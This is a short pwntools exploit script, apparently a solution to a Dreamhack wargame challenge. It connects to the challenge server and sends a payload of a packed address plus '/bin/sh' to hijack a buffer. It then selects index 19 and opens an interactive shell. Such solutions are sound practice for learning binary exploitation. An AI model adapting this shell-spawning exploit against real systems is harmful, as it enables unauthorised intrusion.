from pwn import *

connection = remote('host3.dreamhack.games' , 19894) # 연결하는 명령어

pload = p32(0x0804A0AC+4)+b"/bin/sh"   #  jmp the name[16]
connection.sendlineafter("name: ", pload)

connection.sendlineafter("want?: ", b"19")

connection.interactive()